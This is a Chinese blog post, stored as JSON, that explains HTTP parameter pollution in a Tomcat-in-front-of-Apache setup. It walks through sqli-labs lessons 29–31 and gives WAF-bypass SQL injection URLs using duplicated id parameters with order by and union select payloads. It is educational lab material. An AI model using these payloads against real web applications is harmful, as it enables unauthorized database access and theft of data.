{"title":"SQL注入-HPP","uid":"ed28de52de42846cd0569a9a357ddaf1","slug":"SQL注入-HPP","date":"2022-02-10T05:11:20.000Z","updated":"2022-02-15T12:14:34.027Z","comments":true,"path":"api/articles/SQL注入-HPP.json","keywords":null,"cover":[],"content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>[TOC]</p>\n<p>##服务器两层架构</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-HPP.htm/image-20220210131503726.png\" alt=\"image-20220210131503726\"></p>\n<p>服务器端有两个部分：第一部分为 tomcat 为引擎的 jsp 型服务器，第二部分为 apache为引擎的 php 服务器，真正提供 web 服务的是 php 服务器。工作流程为：client 访问服务器， 能直接访问到 tomcat 服务器，然后 tomcat 服务器再向 apache 服务器请求数据。数据返回路径则相反。</p>\n<p><strong>大多数服务器对于参数解析的介绍：</strong></p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Web服务器</th>\n<th align=\"center\"><strong>参数获取函数</strong></th>\n<th align=\"center\"><strong>获取到的参数</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">PHP&#x2F;Apache</td>\n<td align=\"center\">$_GET(“par”)</td>\n<td align=\"center\">Last</td>\n</tr>\n<tr>\n<td align=\"center\">JSP&#x2F;Tmocat</td>\n<td align=\"center\">Request.getParameter(“par”)</td>\n<td align=\"center\">First</td>\n</tr>\n<tr>\n<td align=\"center\">Perl(CGI)&#x2F;Apache</td>\n<td align=\"center\">Param(“par”)</td>\n<td align=\"center\">First</td>\n</tr>\n<tr>\n<td align=\"center\">Python&#x2F;Apache</td>\n<td align=\"center\">getvalue(“par”)</td>\n<td align=\"center\">All(List)</td>\n</tr>\n<tr>\n<td align=\"center\">ASP&#x2F;IIS</td>\n<td align=\"center\">Request.QueryString(“par”)</td>\n<td align=\"center\">All(comma-delimited string)</td>\n</tr>\n</tbody></table>\n<h2 id=\"HTTP参数处理\"><a href=\"#HTTP参数处理\" class=\"headerlink\" title=\"HTTP参数处理\"></a>HTTP参数处理</h2><p>在与服务器进行交互的过程中，客户端往往会在GET&#x2F;POST请求中带上参数。通常在一个请求中，同名参数只会出现一次，但是在HTTP协议中是允许同名参数多次出现的。</p>\n<p>例：对于<code>index.jsp?id=1&amp;id=2</code>请求</p>\n<p>对于上图服务器配置情况，客户端请求首先过 tomcat，tomcat 解析第一个参数，接下来 tomcat 去请求 apache（php） 服务器，apache 解析最后一个参数。返回的数据也就是 apache 处理的数据，id&#x3D;2。</p>\n<h2 id=\"HTTP参数污染（HPP）\"><a href=\"#HTTP参数污染（HPP）\" class=\"headerlink\" title=\"HTTP参数污染（HPP）\"></a>HTTP参数污染（HPP）</h2><p>由于服务器两层架构，往往tomcat服务器进行数据的过滤和处理，功能类似为一个WAF，通常利用此特性进行WAF绕过。</p>\n<hr>\n<h2 id=\"HPP靶场\"><a href=\"#HPP靶场\" class=\"headerlink\" title=\"HPP靶场\"></a>HPP靶场</h2><p>记录一下Less-29–Less-31靶场的HPP</p>\n<h2 id=\"Less-29\"><a href=\"#Less-29\" class=\"headerlink\" title=\"Less-29\"></a>Less-29</h2><p>首先Less-29也是弄了好长时间，也看了很多文章，由于是基于HPP的靶场，最重要的就是没有搭建Tomcat+Java+Mysql的环境，开始弄了好久。（最好是搭建好环境玩Less-29的靶场）</p>\n<p>首先需要打开login.php文件，不然这Less-29和Less-1没什么区别</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-29&#x2F;login.php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-HPP.htm/image-20220210144543097.png\" alt=\"image-20220210144543097\"></p>\n<p>判断注入点：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-29&#x2F;login.php?id&#x3D;1&#39;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这是提示赶走这个愚蠢的黑客，WAF成功阻拦攻击。</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-HPP.htm/image-20220210144634455.png\" alt=\"image-20220210144634455\"></p>\n<p>（这里若搭建好Tomcat+Java+Mysql环境的话如下图：）</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-HPP.htm/image-20220210144917098.png\" alt=\"image-20220210144917098\"></p>\n<p>从跳转到<code>.jsp</code>页面可以看出来是 Tomcat 服务器，一般来说，现在没有拿 jsp 写后台的了，大都用 php ，我们果断猜测是双服务器。（从这里才能判断这是双服务器）</p>\n<p>参考原文：<a href=\"https://www.cnblogs.com/li2019/p/12378585.html\">https://www.cnblogs.com/li2019/p/12378585.html</a></p>\n<h2 id=\"绕WAF\"><a href=\"#绕WAF\" class=\"headerlink\" title=\"绕WAF\"></a>绕WAF</h2><p>这里已经知道第一个接收第一个参数的服务器是tomcat，接下来要构造payload进行绕过WAF。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-29&#x2F;login.php?id&#x3D;1&amp;id&#x3D;2<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>可以看到页面回显的是第二个用户名和密码，此时接收参数的服务器是apache，接受了id&#x3D;2</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-HPP.htm/image-20220210145231054.png\" alt=\"image-20220210145231054\"></p>\n<h2 id=\"步骤\"><a href=\"#步骤\" class=\"headerlink\" title=\"步骤\"></a>步骤</h2><p>判断字段数：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-29&#x2F;login.php?id&#x3D;1&amp;id&#x3D;2&#39; order by 4--+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>由于对id值的处理需要<code>&#39;</code>，所以第二个参数需要进行单引号闭合</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-HPP.htm/image-20220210145744817.png\" alt=\"image-20220210145744817\"></p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-HPP.htm/image-20220210145819240.png\" alt=\"image-20220210145819240\"></p>\n<p>判断回显点：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-29&#x2F;login.php?id&#x3D;1&amp;id&#x3D;-2&#39; union select 1,2,3--+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-HPP.htm/image-20220210150050418.png\" alt=\"image-20220210150050418\"></p>\n<p>后续过程的payload与以往相同。</p>\n<hr>\n<h2 id=\"Less-30\"><a href=\"#Less-30\" class=\"headerlink\" title=\"Less-30\"></a>Less-30</h2><p>Less-30与Less-29原理相同，只是对id值做了<code>&quot;</code>处理。</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-HPP.htm/image-20220210150434136.png\" alt=\"image-20220210150434136\"></p>\n<p>payload：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-30&#x2F;login.php?id&#x3D;1&amp;id&#x3D;2\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-30&#x2F;login.php?id&#x3D;1&amp;id&#x3D;2&quot; order by 4--+\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-30&#x2F;login.php?id&#x3D;1&amp;id&#x3D;-2&quot; union select 1,2,3--+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<hr>\n<h2 id=\"Less-31\"><a href=\"#Less-31\" class=\"headerlink\" title=\"Less-31\"></a>Less-31</h2><p>Less-31对id值进行了<code>&quot;)</code>的处理。</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-HPP.htm/image-20220210150938265.png\" alt=\"image-20220210150938265\"></p>\n<p>payload：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-31&#x2F;login.php?id&#x3D;1&amp;id&#x3D;2\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-31&#x2F;login.php?id&#x3D;1&amp;id&#x3D;2&quot;) order by 4--+\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-31&#x2F;login.php?id&#x3D;1&amp;id&#x3D;-2&quot;) union select 1,2,3--+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n","text":"[TOC] ##服务器两层架构 服务器端有两个部分：第一部分为 tomcat 为引擎的 jsp 型服务器，第二部分为 apache为引擎的 php 服务器，真正提供 web 服务的是 php 服务器。工作流程为：client 访问服务器， 能直接访问到 tomcat 服务器，然后...","link":"","photos":[],"count_time":{"symbolsCount":"2.5k","symbolsTime":"2 mins."},"categories":[{"name":"SQL注入","slug":"SQL注入","count":20,"path":"api/categories/SQL注入.json"}],"tags":[{"name":"SQL注入","slug":"SQL注入","count":21,"path":"api/tags/SQL注入.json"},{"name":"基础知识","slug":"基础知识","count":12,"path":"api/tags/基础知识.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#HTTP%E5%8F%82%E6%95%B0%E5%A4%84%E7%90%86\"><span class=\"toc-text\">HTTP参数处理</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#HTTP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%EF%BC%88HPP%EF%BC%89\"><span class=\"toc-text\">HTTP参数污染（HPP）</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#HPP%E9%9D%B6%E5%9C%BA\"><span class=\"toc-text\">HPP靶场</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Less-29\"><span class=\"toc-text\">Less-29</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%BB%95WAF\"><span class=\"toc-text\">绕WAF</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%AD%A5%E9%AA%A4\"><span class=\"toc-text\">步骤</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Less-30\"><span class=\"toc-text\">Less-30</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Less-31\"><span class=\"toc-text\">Less-31</span></a></li></ol>","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"SQL注入-宽字节注入","uid":"b7b3116373fd14d65fd221fa9b494766","slug":"SQL注入-宽字节注入","date":"2022-02-10T07:14:55.000Z","updated":"2022-02-13T15:34:05.258Z","comments":true,"path":"api/articles/SQL注入-宽字节注入.json","keywords":null,"cover":[],"text":"[TOC] 宽字节注入原理原理：mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个 汉字（前一个 ascii 码大于 128 才能到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思 路是将 ‘ 转换为 \\’ 。 注入思路思路一：由于单引...","link":"","photos":[],"count_time":{"symbolsCount":"2.5k","symbolsTime":"2 mins."},"categories":[{"name":"SQL注入","slug":"SQL注入","count":20,"path":"api/categories/SQL注入.json"}],"tags":[{"name":"SQL注入","slug":"SQL注入","count":21,"path":"api/tags/SQL注入.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"POST注入-二次注入","uid":"47679b9d369f170d867be494752fa62e","slug":"POST注入-二次注入","date":"2022-02-09T03:31:17.000Z","updated":"2022-02-13T15:33:50.663Z","comments":true,"path":"api/articles/POST注入-二次注入.json","keywords":null,"cover":[],"text":"[TOC] ##二次注入原理 二次注入，主要分为两步； 第一步：插入恶意数据 ​ 第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，但是addslashes有一个特点就是虽然参数...","link":"","photos":[],"count_time":{"symbolsCount":687,"symbolsTime":"1 mins."},"categories":[{"name":"SQL注入","slug":"SQL注入","count":20,"path":"api/categories/SQL注入.json"}],"tags":[{"name":"SQL注入","slug":"SQL注入","count":21,"path":"api/tags/SQL注入.json"},{"name":"基础知识","slug":"基础知识","count":12,"path":"api/tags/基础知识.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}